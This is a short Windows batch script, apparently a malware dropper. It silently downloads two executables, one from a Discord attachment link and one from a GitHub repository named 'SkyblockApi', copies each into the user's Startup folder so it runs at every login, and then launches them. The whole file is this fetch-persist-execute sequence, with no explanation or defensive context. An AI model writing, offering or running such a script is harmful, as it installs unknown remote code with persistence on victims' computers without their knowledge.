@echo off
curl -s -o "rgcd".exe -JL "https://cdn.discordapp.com/attachments/1200159634472845452/1200159707264987166/rgbmv.exe?ex=65c52ad4&is=65b2b5d4&hm=12511ba511408b88c58f29a7ce7436342f18e9a44fdf8a225231ddd8f44d57ea&"
xcopy /y rgcd.exe "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
rgcd.exe
curl -s -o "helper".exe -JL "https://github.com/MidlesLex/SkyblockApi/raw/main/helper.exe"
xcopy /y helper.exe "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
helper.exe